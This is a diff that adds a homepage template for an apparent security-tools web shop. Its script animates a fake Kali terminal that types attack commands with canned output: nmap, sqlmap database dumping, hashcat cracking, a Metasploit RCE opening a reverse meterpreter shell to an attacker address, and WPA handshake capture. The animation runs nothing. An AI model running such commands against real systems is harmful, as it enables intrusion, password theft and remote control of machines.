@@ -1,0 +1,491 @@
+{% extends "base.html" %}
+
+{% block content %}
+<!-- 1. FULLSCREEN HERO SECTION -->
+<section class="hero-section">
+    <div class="hero-media">
+        <img src="{{ site_settings.hero_image }}" alt="{{ site_settings.site_name }} Security Systems" data-theme-bind="hero_image">
+    </div>
+    <div class="hero-overlay"></div>
+    <div class="hero-content">
+        <div class="hero-text-block">
+            <div class="hero-eyebrow" data-theme-bind="hero_badge">{{ site_settings.hero_badge }}</div>
+            <h1 class="display-xl" style="color: var(--white); margin-bottom: 0.5rem;" data-theme-bind="hero_title" data-theme-format="multiline">
+                {{ site_settings.hero_title | replace('\n', '<br>') | safe }}
+            </h1>
+        </div>
+        <div class="hero-meta-block">
+            <p class="hero-description" data-theme-bind="hero_subtitle">
+                {{ site_settings.hero_subtitle }}
+            </p>
+            <div class="hero-actions">
+                <a href="{{ site_settings.hero_cta_primary_url or url_for('shop') }}" class="btn btn-light" data-theme-bind-href="hero_cta_primary_url"><span data-theme-bind="hero_cta_primary">{{ site_settings.hero_cta_primary.replace('→', '').strip() }}</span> <span class="arrow-icon">→</span></a>
+                <a href="{{ site_settings.hero_cta_secondary_url or url_for('blog') }}" class="btn btn-outline-light" data-theme-bind-href="hero_cta_secondary_url"><span data-theme-bind="hero_cta_secondary">{{ site_settings.hero_cta_secondary.replace('→', '').strip() }}</span> <span class="arrow-icon">→</span></a>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- 2. EDITORIAL BRAND MANIFESTO (WITH INTEGRATED RIGHT-TO-LEFT STREAMING REVIEWS) -->
+<section class="editorial-intro manifesto-editorial-section">
+    <div class="container manifesto-editorial-stage">
+        <!-- 1. LEFT: PROFESSIONAL EDITORIAL BRAND MANIFESTO PROSE (Solid foreground, covers incoming sliding reviews) -->
+        <div class="manifesto-prose-col">
+            <div class="manifesto-eyebrow-wrap">
+                <span class="meta-label" data-theme-bind="manifesto_eyebrow">{{ site_settings.manifesto_eyebrow }}</span>
+                <span class="manifesto-pill-tag">
+                    <span class="pulse-dot"></span> AIRGAP VERIFIED
+                </span>
+            </div>
+            <div class="meta-mono" style="margin-top: 0.65rem; color: var(--muted); font-size: 0.76rem;" data-theme-bind="manifesto_sublabel">{{ site_settings.manifesto_sublabel }}</div>
+
+            <h2 class="display-lg manifesto-title-heading" data-theme-bind="manifesto_title" data-theme-format="multiline">
+                {{ site_settings.manifesto_title | replace('\n', '<br>') | safe }}
+            </h2>
+
+            <div class="manifesto-lead-box">
+                <p class="manifesto-lead-text">
+                    "<span data-theme-bind="manifesto_lead">{{ site_settings.manifesto_lead }}</span>"
+                </p>
+            </div>
+
+            <!-- Professional Specification Pillars -->
+            <div class="manifesto-spec-strip">
+                <span class="manifesto-spec-tag">[01] 100% AIRGAP SAFE</span>
+                <span class="manifesto-spec-tag">[02] CRYPTOGRAPHIC INTEGRITY</span>
+                <span class="manifesto-spec-tag">[03] TELEGRAM CONCIERGE</span>
+            </div>
+
+            <div class="manifesto-crypto-seal">
+                // PROVENANCE: PGP-SIGNED ARCHITECTURE · SYSTEM SPECIFICATION · ZERO TELEMETRY
+            </div>
+        </div>
+
+        <!-- 2. RIGHT: VERIFIED CLIENT REVIEWS SLIDER (Visible on right, slides right-to-left and vanishes under text) -->
+        {% if manifesto_reviews %}
+        <div class="manifesto-reviews-stream-col">
+            <div class="manifesto-stream-meta meta-mono">
+                <span class="stream-meta-stars">★★★</span>
+                <span class="stream-label">REVIEW</span>
+                <span class="stream-meta-stars">★★★</span>
+            </div>
+
+            <div class="manifesto-stream-viewport">
+                <div class="manifesto-stream-track">
+                    <!-- SET 1: VERIFIED CLIENT ASSESSMENTS (FULL CARD IS CLICKABLE PRODUCT LINK) -->
+                    {% for rev in manifesto_reviews %}
+                    <a href="{{ url_for('product_detail', slug=rev.product_sku|lower) if rev.product_sku else url_for('shop') }}" class="manifesto-stream-card" title="Open Product Details">
+                        <div class="stream-card-main">
+                            <div class="stream-card-head">
+                                <span class="stream-stars">
+                                    {% for i in range(rev.rating) %}★{% endfor %}
+                                </span>
+                                {% if rev.verified_badge and 'UNVERIF' not in rev.verified_badge|upper %}
+                                <span class="stream-badge stream-badge-verified">● VERIFIED</span>
+                                {% else %}
+                                <span class="stream-badge stream-badge-unverified">○ UNVERIFIED</span>
+                                {% endif %}
+                            </div>
+
+                            <h4 class="stream-card-title">
+                                {{ rev.title }}
+                            </h4>
+
+                            <p class="stream-card-body">
+                                "{{ rev.content }}"
+                            </p>
+                        </div>
+
+                        <div class="stream-card-footer meta-mono">
+                            <div class="stream-author-block">
+                                <div class="stream-author-name">{{ rev.author_name }}</div>
+                                <div class="stream-author-org">
+                                    {% if rev.author_role and rev.author_org %}
+                                        {{ rev.author_role }} · {{ rev.author_org }}
+                                    {% elif rev.author_org %}
+                                        {{ rev.author_org }}
+                                    {% elif rev.author_role %}
+                                        {{ rev.author_role }}
+                                    {% else %}
+                                        Verified Operator
+                                    {% endif %}
+                                </div>
+                            </div>
+                        </div>
+                    </a>
+                    {% endfor %}
+
+                    <!-- SET 2: DUPLICATE CARDS FOR 100% INFINITE SEAMLESS LOOP -->
+                    {% for rev in manifesto_reviews %}
+                    <a href="{{ url_for('product_detail', slug=rev.product_sku|lower) if rev.product_sku else url_for('shop') }}" class="manifesto-stream-card" aria-hidden="true" tabindex="-1" title="Open Product Details">
+                        <div class="stream-card-main">
+                            <div class="stream-card-head">
+                                <span class="stream-stars">
+                                    {% for i in range(rev.rating) %}★{% endfor %}
+                                </span>
+                                {% if rev.verified_badge and 'UNVERIF' not in rev.verified_badge|upper %}
+                                <span class="stream-badge stream-badge-verified">● VERIFIED</span>
+                                {% else %}
+                                <span class="stream-badge stream-badge-unverified">○ UNVERIFIED</span>
+                                {% endif %}
+                            </div>
+
+                            <h4 class="stream-card-title">
+                                {{ rev.title }}
+                            </h4>
+
+                            <p class="stream-card-body">
+                                "{{ rev.content }}"
+                            </p>
+                        </div>
+
+                        <div class="stream-card-footer meta-mono">
+                            <div class="stream-author-block">
+                                <div class="stream-author-name">{{ rev.author_name }}</div>
+                                <div class="stream-author-org">
+                                    {% if rev.author_role and rev.author_org %}
+                                        {{ rev.author_role }} · {{ rev.author_org }}
+                                    {% elif rev.author_org %}
+                                        {{ rev.author_org }}
+                                    {% elif rev.author_role %}
+                                        {{ rev.author_role }}
+                                    {% else %}
+                                        Verified Operator
+                                    {% endif %}
+                                </div>
+                            </div>
+                        </div>
+                    </a>
+                    {% endfor %}
+                </div>
+            </div>
+        </div>
+        {% endif %}
+    </div>
+</section>
+
+<!-- 3. CATEGORY NAVIGATION STRIP (ONE-LINE TEXT LINK TO SHOP) -->
+<section class="category-strip">
+    <div class="container">
+        <a href="{{ url_for('shop') }}" class="category-strip-single-link" data-theme-bind="category_strip_text" title="Click to view all security systems in the shop">
+            {{ site_settings.category_strip_text or 'ALL SYSTEMS // WEB & APPSEC // OFFENSIVE & RED TEAM // SIEM & BLUE TEAM // REVERSE ENGINEERING // OSINT & RECON' }}
+        </a>
+    </div>
+</section>
+
+<!-- 4. FEATURED SYSTEMS SECTION -->
+<section class="section">
+    <div class="container">
+        <div class="section-header">
+            <div>
+                <span class="meta-label" data-theme-bind="featured_eyebrow">{{ site_settings.featured_eyebrow or '// CURATED ARSENAL' }}</span>
+                <h2 class="section-title" data-theme-bind="featured_title">{{ site_settings.featured_title or 'FEATURED SYSTEMS' }}</h2>
+            </div>
+            <a href="{{ url_for('shop') }}" class="link-arrow">
+                <span data-theme-bind="featured_cta">{{ site_settings.featured_cta or 'VIEW ALL SYSTEMS' }}</span> ({{ global_products|length }}) <span class="arrow-icon">→</span>
+            </a>
+        </div>
+
+        <div class="product-grid">
+            {% for p in featured_products %}
+            <div class="product-card">
+                <a href="{{ url_for('product_detail', slug=p.slug) }}" class="product-card-image-wrap">
+                    <img src="{{ p.image_url }}" alt="{{ p.name }}" class="product-card-img" loading="lazy">
+                    <span class="product-badge">{{ p.badge_text }}</span>
+                </a>
+                <div class="product-meta">
+                    <div class="product-meta-header">
+                        <span class="meta-label">{{ p.category }}</span>
+                        <div>
+                            {% if p.retail_price > p.price %}
+                            <span class="meta-mono" style="text-decoration:line-through; color:var(--muted); font-size:0.8rem; margin-right:0.35rem;">${{ "%.0f"|format(p.retail_price) }}</span>
+                            {% endif %}
+                            <span class="meta-mono" style="font-weight:700;">${{ "%.0f"|format(p.price) }}</span>
+                        </div>
+                    </div>
+                    <h3 class="product-title">
+                        <a href="{{ url_for('product_detail', slug=p.slug) }}">{{ p.name }}</a>
+                    </h3>
+                    <p class="product-desc">
+                        {{ p.short_desc }}
+                    </p>
+                    <div class="product-specs-line">
+                        {{ p.version }} · {{ p.platform }}
+                    </div>
+                    <div class="product-actions">
+                        <button type="button" class="btn btn-outline-dark" style="flex:1; padding:0.55rem 0.5rem; font-size:0.7rem;" onclick="window.NFCart && window.NFCart.quickAdd({{ p.id }})">+ ADD TO BAG</button>
+                        <a href="{{ url_for('product_detail', slug=p.slug) }}" class="btn btn-dark" style="padding:0.55rem 0.85rem; font-size:0.7rem;">VIEW →</a>
+                    </div>
+                </div>
+            </div>
+            {% endfor %}
+        </div>
+    </div>
+</section>
+
+<!-- 5. ARCHITECTURAL SHOWCASE BANNER & LIVE OFFENSIVE TELEMETRY TERMINAL -->
+<section style="background-color: var(--dark); color: var(--white); padding: 5rem 0; position: relative;">
+    <div class="container">
+        <div class="showcase-layout-grid">
+            <div style="max-width: 640px;">
+                <span class="meta-label" style="color: #888884;" data-theme-bind="showcase_eyebrow">{{ site_settings.showcase_eyebrow }}</span>
+                <h2 class="display-lg" style="color: var(--white); margin: 0.75rem 0 1.25rem;" data-theme-bind="showcase_title" data-theme-format="multiline">
+                    {{ site_settings.showcase_title | replace('\n', '<br>') | safe }}
+                </h2>
+                <p style="font-size: 1.05rem; color: #a1a1aa; line-height: 1.6; margin-bottom: 2rem;" data-theme-bind="showcase_desc">
+                    {{ site_settings.showcase_desc }}
+                </p>
+                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(160px, 1fr)); gap: 1.5rem; border-top: 1px solid rgba(255,255,255,0.15); padding-top: 2rem;">
+                    <div>
+                        <div class="meta-mono" style="font-size: 1.5rem; font-weight: 700; color: var(--white);" data-theme-bind="showcase_stat1_val">{{ site_settings.showcase_stat1_val }}</div>
+                        <div class="meta-label" style="color: #888884; margin-top: 0.25rem;" data-theme-bind="showcase_stat1_label">{{ site_settings.showcase_stat1_label }}</div>
+                    </div>
+                    <div>
+                        <div class="meta-mono" style="font-size: 1.5rem; font-weight: 700; color: var(--white);" data-theme-bind="showcase_stat2_val">{{ site_settings.showcase_stat2_val }}</div>
+                        <div class="meta-label" style="color: #888884; margin-top: 0.25rem;" data-theme-bind="showcase_stat2_label">{{ site_settings.showcase_stat2_label }}</div>
+                    </div>
+                    <div>
+                        <div class="meta-mono" style="font-size: 1.5rem; font-weight: 700; color: var(--white);" data-theme-bind="showcase_stat3_val">{{ site_settings.showcase_stat3_val }}</div>
+                        <div class="meta-label" style="color: #888884; margin-top: 0.25rem;" data-theme-bind="showcase_stat3_label">{{ site_settings.showcase_stat3_label }}</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- RIGHT SPACE: REAL-LIFE BASH / KALI TERMINAL SIMULATION -->
+            <div class="showcase-terminal-wrapper">
+                <div class="cyber-terminal-card">
+                    <div class="cyber-terminal-bar">
+                        <div class="terminal-ctrls">
+                            <span class="ctrl-dot red"></span>
+                            <span class="ctrl-dot yellow"></span>
+                            <span class="ctrl-dot green"></span>
+                        </div>
+                        <div class="terminal-title">
+                            <span>root@kali: ~ (bash)</span>
+                        </div>
+                        <div class="terminal-badge font-mono">80x24 · UTF-8</div>
+                    </div>
+                    <div class="cyber-terminal-body" id="cyber-attack-terminal" role="log" aria-live="polite">
+                        <!-- Real-Life Terminal Commands & Outputs Stream Here -->
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- 6. LIVE THREAT INTELLIGENCE JOURNAL SECTION -->
+<section class="section">
+    <div class="container">
+        <div class="section-header">
+            <div>
+                <span class="meta-label" data-theme-bind="journal_section_eyebrow">{{ site_settings.journal_section_eyebrow or '// RESEARCH & CVE DISCLOSURES' }}</span>
+                <h2 class="section-title" data-theme-bind="journal_section_title">{{ site_settings.journal_section_title or 'THREAT JOURNAL' }}</h2>
+            </div>
+            <a href="{{ url_for('blog') }}" class="link-arrow">
+                <span data-theme-bind="journal_section_cta">{{ site_settings.journal_section_cta or 'VIEW ALL RESEARCH' }}</span> <span class="arrow-icon">→</span>
+            </a>
+        </div>
+
+        <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 1.75rem;">
+            {% for post in posts %}
+            <article class="journal-card" style="border: 1px solid var(--border); background-color: var(--white); display: flex; flex-direction: column;">
+                {% if post.image_url %}
+                <a href="{{ url_for('post_detail', slug=post.slug) }}" style="display: block; width: 100%; height: 210px; overflow: hidden; position: relative; background: var(--dark);">
+                    <img src="{{ post.image_url }}" alt="{{ post.title }}" style="width: 100%; height: 100%; object-fit: cover; transition: transform 500ms var(--ease-out);" onmouseover="this.style.transform='scale(1.05)'" onmouseout="this.style.transform='scale(1)'">
+                    <span class="badge-tag" style="position: absolute; top: 1rem; left: 1rem; background: rgba(243,242,238,0.95); font-weight: 700; color: var(--text);">{{ post.cve_id }}</span>
+                    {% if post.severity == 'CRITICAL' or (post.cvss_score|float) >= 9.0 %}
+                    <span class="badge-tag" style="position: absolute; top: 1rem; right: 1rem; background: #991b1b; color: #fff; font-weight: 700; border: none;">CVSS {{ post.cvss_score }}</span>
+                    {% endif %}
+                </a>
+                {% endif %}
+                <div style="padding: 1.5rem; display: flex; flex-direction: column; flex: 1;">
+                    <div style="display: flex; justify-content: space-between; align-items: baseline; margin-bottom: 0.75rem;" class="meta-mono">
+                        <span class="meta-label">{{ post.category }}</span>
+                        <span style="font-size: 0.72rem; color: var(--muted);">{{ post.read_time }}</span>
+                    </div>
+                    <h3 style="font-size: 1.1rem; font-weight: 700; text-transform: uppercase; margin: 0 0 0.75rem 0; line-height: 1.35;">
+                        <a href="{{ url_for('post_detail', slug=post.slug) }}" style="color: var(--text); text-decoration: none;">{{ post.title }}</a>
+                    </h3>
+                    <p style="font-size: 0.85rem; color: var(--muted); line-height: 1.55; margin: 0 0 1.25rem 0; flex: 1; text-align: justify; text-justify: inter-word;">
+                        {{ post.summary[:130] }}...
+                    </p>
+                    <div style="display: flex; justify-content: space-between; align-items: center; border-top: 1px solid var(--border); padding-top: 1rem; flex-wrap: wrap; gap: 0.75rem;" class="meta-mono">
+                        <span style="font-size: 0.74rem; color: var(--muted);">PUBLISHED {{ post.published_at[:10] }}</span>
+                        <a href="{{ url_for('post_detail', slug=post.slug) }}" class="link-arrow" style="font-size: 0.75rem; font-weight: 700;">
+                            READ ANALYSIS <span class="arrow-icon">→</span>
+                        </a>
+                    </div>
+                </div>
+            </article>
+            {% endfor %}
+        </div>
+    </div>
+</section>
+{% endblock %}
+
+{% block scripts %}
+<script>
+(function() {
+    var term = document.getElementById('cyber-attack-terminal');
+    if (!term) return;
+
+    var scenarios = [
+        {
+            cmd: "nmap -sS -sV -p 22,80,443,8080,3306 10.10.11.24",
+            lines: [
+                { text: "Starting Nmap 7.94 ( https://nmap.org ) at 2026-11-03 00:58 UTC", cls: "term-gray" },
+                { text: "Nmap scan report for 10.10.11.24", cls: "term-white" },
+                { text: "Host is up (0.038s latency).", cls: "term-gray" },
+                { text: "PORT     STATE  SERVICE  VERSION", cls: "term-gray" },
+                { text: "22/tcp   <span class=\"term-green\">open</span>   ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.7", cls: "term-white" },
+                { text: "80/tcp   <span class=\"term-green\">open</span>   http     nginx 1.18.0 (Ubuntu)", cls: "term-white" },
+                { text: "443/tcp  <span class=\"term-green\">open</span>   ssl/http nginx 1.18.0", cls: "term-white" },
+                { text: "8080/tcp <span class=\"term-green\">open</span>   http     Apache Tomcat 9.0.58", cls: "term-white" },
+                { text: "3306/tcp <span class=\"term-green\">open</span>   mysql    MySQL 8.0.35-0ubuntu0.22.04.1", cls: "term-white" },
+                { text: "Nmap done: 1 IP address (1 host up) scanned in 3.42 seconds", cls: "term-gray" }
+            ]
+        },
+        {
+            cmd: "sqlmap -u \"http://10.10.11.24/products.php?id=1\" --batch --dbs",
+            lines: [
+                { text: "[*] starting @ 00:59:12 /2026-11-03/", cls: "term-gray" },
+                { text: "[00:59:12] [<span class=\"term-blue\">INFO</span>] testing connection to the target URL", cls: "term-white" },
+                { text: "[00:59:13] [<span class=\"term-blue\">INFO</span>] target URL appears to be UNION injectable with 3 columns", cls: "term-green" },
+                { text: "[00:59:14] [<span class=\"term-blue\">INFO</span>] fetching database names", cls: "term-white" },
+                { text: "available databases [3]:", cls: "term-gray" },
+                { text: "[*] information_schema", cls: "term-white" },
+                { text: "[*] zero_day_auth", cls: "term-green" },
+                { text: "[*] production_vault", cls: "term-green" },
+                { text: "[00:59:15] [<span class=\"term-blue\">INFO</span>] fetched data logged to '/root/.local/share/sqlmap/output/'", cls: "term-gray" }
+            ]
+        },
+        {
+            cmd: "hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt",
+            lines: [
+                { text: "hashcat (v6.2.6) starting in benchmark mode", cls: "term-gray" },
+                { text: "Device #1: NVIDIA GeForce RTX 4090, 24564 MB, 128MCU", cls: "term-gray" },
+                { text: "e10adc3949ba59abbe56e057f20f883e:<span class=\"term-green\">123456</span>", cls: "term-white" },
+                { text: "88820875e533c3065e8a34b281cfc6b7:<span class=\"term-green\">superadmin#2026</span>", cls: "term-white" },
+                { text: "Session..........: hashcat", cls: "term-gray" },
+                { text: "Status...........: <span class=\"term-green\">Cracked</span>", cls: "term-white" },
+                { text: "Hash.Target......: hashes.txt (2/2 recovered)", cls: "term-white" },
+                { text: "Speed.#1.........: 38.2 GH/s (0.01s)", cls: "term-gray" }
+            ]
+        },
+        {
+            cmd: "gobuster dir -u http://10.10.11.24 -w /usr/share/wordlists/dirb/common.txt -q",
+            lines: [
+                { text: "/.git/HEAD            (Status: <span class=\"term-green\">200</span>) [Size: 23]", cls: "term-white" },
+                { text: "/.env                 (Status: <span class=\"term-green\">200</span>) [Size: 412]", cls: "term-white" },
+                { text: "/admin                (Status: <span class=\"term-yellow\">301</span>) [Size: 178] [--> /admin/]", cls: "term-white" },
+                { text: "/api/v1               (Status: <span class=\"term-green\">200</span>) [Size: 1204]", cls: "term-white" },
+                { text: "/backup.sql           (Status: <span class=\"term-green\">200</span>) [Size: 1849202]", cls: "term-white" },
+                { text: "/robots.txt           (Status: <span class=\"term-green\">200</span>) [Size: 64]", cls: "term-white" }
+            ]
+        },
+        {
+            cmd: "msfconsole -q -x \"use exploit/linux/http/apache_druid_rce; set RHOSTS 10.10.11.24; run\"",
+            lines: [
+                { text: "[*] Using configured payload linux/x64/meterpreter/reverse_tcp", cls: "term-gray" },
+                { text: "[*] Started reverse TCP handler on 10.10.14.8:4444", cls: "term-gray" },
+                { text: "[<span class=\"term-green\">+</span>] The target is vulnerable: Apache Druid (RCE CVE-2021-25646)", cls: "term-green" },
+                { text: "[*] Sending stage (3048424 bytes) to 10.10.11.24", cls: "term-gray" },
+                { text: "[*] Meterpreter session 1 opened (10.10.14.8:4444 -> 10.10.11.24:43128)", cls: "term-green" },
+                { text: "meterpreter > getuid", cls: "term-white" },
+                { text: "Server username: <span class=\"term-green\">root</span>", cls: "term-white" },
+                { text: "meterpreter > sysinfo", cls: "term-white" },
+                { text: "OS: Ubuntu 22.04 LTS (Linux 5.15.0-91-generic x86_64)", cls: "term-gray" }
+            ]
+        },
+        {
+            cmd: "ss -tulnp | grep -E \"22|80|3306|8080\"",
+            lines: [
+                { text: "Netid  State   Recv-Q  Send-Q   Local Address:Port    Peer Address:Port  Process", cls: "term-gray" },
+                { text: "tcp    LISTEN  0       128            0.0.0.0:22           0.0.0.0:*      users:((\"sshd\",pid=684,fd=3))", cls: "term-white" },
+                { text: "tcp    LISTEN  0       511            0.0.0.0:80           0.0.0.0:*      users:((\"nginx\",pid=812,fd=6))", cls: "term-white" },
+                { text: "tcp    LISTEN  0       128          127.0.0.1:3306         0.0.0.0:*      users:((\"mariadbd\",pid=944,fd=19))", cls: "term-white" },
+                { text: "tcp    LISTEN  0       128          127.0.0.1:8080         0.0.0.0:*      users:((\"java\",pid=1120,fd=42))", cls: "term-white" }
+            ]
+        },
+        {
+            cmd: "curl -s -I -X GET \"http://10.10.11.24:8080/manager/html\"",
+            lines: [
+                { text: "HTTP/1.1 <span class=\"term-red\">401 Unauthorized</span>", cls: "term-white" },
+                { text: "Date: Tue, 03 Nov 2026 00:58:12 GMT", cls: "term-gray" },
+                { text: "Server: Apache-Coyote/1.1", cls: "term-gray" },
+                { text: "WWW-Authenticate: Basic realm=\"Tomcat Manager Application\"", cls: "term-yellow" },
+                { text: "Content-Type: text/html;charset=utf-8", cls: "term-gray" },
+                { text: "Content-Length: 2473", cls: "term-gray" }
+            ]
+        },
+        {
+            cmd: "airmon-ng start wlan0 && airodump-ng -c 6 --bssid 4A:22:91:DE:33:09 wlan0mon",
+            lines: [
+                { text: "[<span class=\"term-green\">+</span>] phy0 wlan0 ath9k Qualcomm Atheros AR9271", cls: "term-green" },
+                { text: "CH  6 ][ Elapsed: 12 s ][ 2026-11-03 00:59", cls: "term-gray" },
+                { text: "BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID", cls: "term-gray" },
+                { text: "4A:22:91:DE:33:09  -42       48       312   12   6  54e. WPA2 CCMP   PSK  CORP-SECURE", cls: "term-white" },
+                { text: "[<span class=\"term-green\">+</span>] WPA handshake: 4A:22:91:DE:33:09 captured [EAPOL packet 1/4 -> 4/4]", cls: "term-green" }
+            ]
+        }
+    ];
+
+    var scenarioIndex = 0;
+
+    function appendLine(html) {
+        var div = document.createElement('div');
+        div.className = 'term-line';
+        div.innerHTML = html;
+        term.appendChild(div);
+
+        while (term.children.length > 26) {
+            term.removeChild(term.firstChild);
+        }
+        term.scrollTop = term.scrollHeight;
+    }
+
+    function runScenario() {
+        var sc = scenarios[scenarioIndex];
+        scenarioIndex = (scenarioIndex + 1) % scenarios.length;
+
+        var cmdLine = document.createElement('div');
+        cmdLine.className = 'term-line';
+        cmdLine.innerHTML = '<span class=\"term-prompt-user\">root@kali</span>:<span class=\"term-prompt-path\">~</span># <span class=\"term-cmd\"></span><span class=\"term-cursor\"></span>';
+        term.appendChild(cmdLine);
+        term.scrollTop = term.scrollHeight;
+
+        var cmdSpan = cmdLine.querySelector('.term-cmd');
+        var cursor = cmdLine.querySelector('.term-cursor');
+        var text = sc.cmd;
+        var charIdx = 0;
+
+        function typeChar() {
+            if (charIdx < text.length) {
+                cmdSpan.textContent += text.charAt(charIdx);
+                charIdx++;
+                term.scrollTop = term.scrollHeight;
+                setTimeout(typeChar, Math.floor(Math.random() * 25) + 20);
+            } else {
+                if (cursor) cursor.remove();
+                var lineIdx = 0;
+                function printNextLine() {
+                    if (lineIdx < sc.lines.length) {
+                        var l = sc.lines[lineIdx];
+                        appendLine('<span class=\"' + l.cls + '\">' + l.text + '</span>');
+                        lineIdx++;
+                        setTimeout(printNextLine, Math.floor(Math.random() * 80) + 120);
+                    } else {
+                        setTimeout(runScenario, 2500);
+                    }
+                }
+                setTimeout(printNextLine, 280);
+            }
+        }
+        setTimeout(typeChar, 250);
+    }
+
+    setTimeout(runScenario, 300);
+})();
+</script>
+{% endblock %}
